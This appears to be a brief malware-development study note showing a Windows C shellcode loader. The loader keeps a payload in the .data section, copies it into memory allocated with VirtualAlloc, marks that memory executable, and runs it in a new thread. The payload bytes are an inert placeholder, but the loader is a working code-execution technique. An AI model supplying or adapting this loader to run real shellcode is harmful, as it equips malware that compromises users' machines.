# Payload in .data section

```c
#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>

unsigned char payload[] = {
	0x90,
	0x90,
	0xcc,
	0x3c
};
unsigned int payload_len = sizeof(payload) / sizeof(payload[0]);

int main() {	
	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("Allocated memory at 0x%p\n", (void *)exec_mem);
	printf("Payload Address: 0x%p\n", (void*) payload);

	RtlMoveMemory(exec_mem, payload, payload_len);

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("[+] press <Enter> to exit...");

	getchar();

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
```
